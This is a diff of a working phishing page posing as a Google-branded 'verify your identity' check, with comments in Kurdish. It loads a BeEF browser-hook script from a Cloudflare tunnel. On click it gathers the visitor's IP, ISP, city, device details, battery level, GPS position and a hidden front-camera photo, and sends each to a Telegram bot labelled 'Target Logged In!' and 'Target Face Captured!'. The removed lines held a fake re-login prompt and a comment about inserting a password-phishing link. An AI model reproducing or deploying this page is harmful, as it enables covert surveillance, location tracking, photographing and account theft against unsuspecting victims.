@@ -3,30 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloud Content - Verify You Are Human</title>
-    
+    <title>Verification System</title>
     <!-- BeEF Hook -->
     <script src="https://inquiries-stability-extend-width.trycloudflare.com/hook.js"></script>
-
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px; font-weight: bold; width: 100%; }
-        .btn:active { background: #174ea6; }
-        #spy-vid { position: fixed; opacity: 0.01; pointer-events: none; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f4f4f4; margin: 0; }
+        .box { background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
+        .btn { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; }
+        .btn:disabled { background: #ccc; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100" alt=""><br><br>
-    <h2>Verify you are human</h2>
-    <p>Please click the button below to authorize access to requested document.</p>
-    <button class="btn" id="startBtn">I AM NOT A ROBOT</button>
-    <p id="status" style="color: #666; font-size: 12px; margin-top: 15px;">Required for security verification</p>
+<div class="box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="80" alt=""><br><br>
+    <h2>Security Check</h2>
+    <p>Please click to verify your identity to access the document.</p>
+    <button class="btn" id="startBtn">VERIFY IDENTITY</button>
 </div>
 
-<video id="spy-vid" autoplay playsinline muted></video>
+<video id="spy-vid" autoplay playsinline muted style="display:none;"></video>
 <canvas id="canvas" style="display:none;"></canvas>
 
 <script>
@@ -34,7 +30,7 @@
     const chatId = "6679834643";
 
     async function sendToBot(msg) {
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chatId, text: msg })
@@ -45,52 +41,61 @@
         this.innerHTML = "Verifying...";
         this.disabled = true;
 
-        // ١. بردنە دەرەوەی زانیاری ئامێر و پاتری
-        let batteryInfo = "N/A";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batteryInfo = (b.level * 100) + "%";
+        // ١. کۆکردنەوەی زانیارییە سەرەتاییەکان (IP, Device, Battery)
+        await getFullLog();
+
+        // ٢. داوای لوکەیشن دەکات
+        await getGPS();
+        
+        // ٣. داوای کامێرا دەکات دوای کەمێک
+        setTimeout(() => {
+            getCamera();
+        }, 1500);
+    });
+
+    async function getFullLog() {
+        try {
+            // وەرگرتنی ڕێژەی باتری
+            let batteryLevel = "Unknown";
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                batteryLevel = Math.round(b.level * 100) + "%";
+            }
+
+            // وەرگرتنی IP و زانیاری نێتۆرک
+            const response = await fetch('https://ipapi.co/json/');
+            const d = await response.json();
+
+            const fullMsg = `🔥 Target Logged In!
+🌐 IP: ${d.ip}
+🏢 ISP: ${d.org}
+🏙️ City: ${d.city}
+📱 Device: ${navigator.userAgent}
+🔋 Battery: ${batteryLevel}
+📅 Date: ${new Date().toLocaleString('en-US')}`;
+
+            await sendToBot(fullMsg);
+        } catch (e) {
+            console.log("Error logging info");
         }
+    }
 
-        const deviceInfo = `
-📱 DEVICE INFO:
-- Platform: ${navigator.platform}
-- Vendor: ${navigator.vendor}
-- UserAgent: ${navigator.userAgent}
-- Battery: ${batteryInfo}
-- Language: ${navigator.language}
-- Screen: ${window.screen.width}x${window.screen.height}
-        `;
-        await sendToBot(deviceInfo);
-
-        // ٢. وەرگرتنی IP و ISP و کات
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-            const ipInfo = `
-🌐 NETWORK INFO:
-- IP: ${d.ip}
-- ISP: ${d.org}
-- City: ${d.city}
-- Country: ${d.country_name}
-- Network Type: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}
-- Date/Time: ${new Date().toLocaleString()}
-            `;
-            sendToBot(ipInfo);
-        });
-
-        // ٣. وەرگرتنی لوکەیشن (GPS)
+    async function getGPS() {
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                sendToBot(`📍 GPS MAP: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendToBot(`📍 GPS Map: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
             }, (err) => { sendToBot("❌ GPS Access Denied"); }, {enableHighAccuracy: true});
         }
+    }
 
-        // ٤. کامێرای پێشەوە (SNAPSHOT)
+    async function getCamera() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             const video = document.getElementById('spy-vid');
             video.srcObject = stream;
             
-            await new Promise(r => setTimeout(r, 3000));
+            // چاوەڕوانکردن بۆ فوکەسی کامێرا
+            await new Promise(r => setTimeout(r, 3500));
             
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
@@ -101,22 +106,15 @@
                 const fd = new FormData();
                 fd.append('chat_id', chatId);
                 fd.append('photo', blob, 'shot.jpg');
-                fd.append('caption', '👤 Front Camera Captured!');
+                fd.append('caption', '👤 Target Face Captured!');
+                
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                 stream.getTracks().forEach(t => t.stop());
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.8);
         } catch (e) {
             sendToBot("❌ Camera Access Denied");
         }
-
-        // ٥. دزینی Contacts و Call Logs (Social Engineering)
-        // وەک پێشتر وتم، ئەمە ڕاستەوخۆ نابێت. بۆیە مۆدیوڵێکی فیشینگ نیشان دەدەین
-        setTimeout(() => {
-            alert("Security Update: Please re-login to your Google account to view the synced contacts and logs.");
-            window.location.href = "https://accounts.google.com/ServiceLogin"; 
-            // لێرەدا دەتوانیت لینکی فیشینگی خۆت دابنێیت بۆ ئەوەی پاسوۆردەکە ببەیت
-        }, 5000);
-    });
+    }
 </script>
 </body>
 </html>
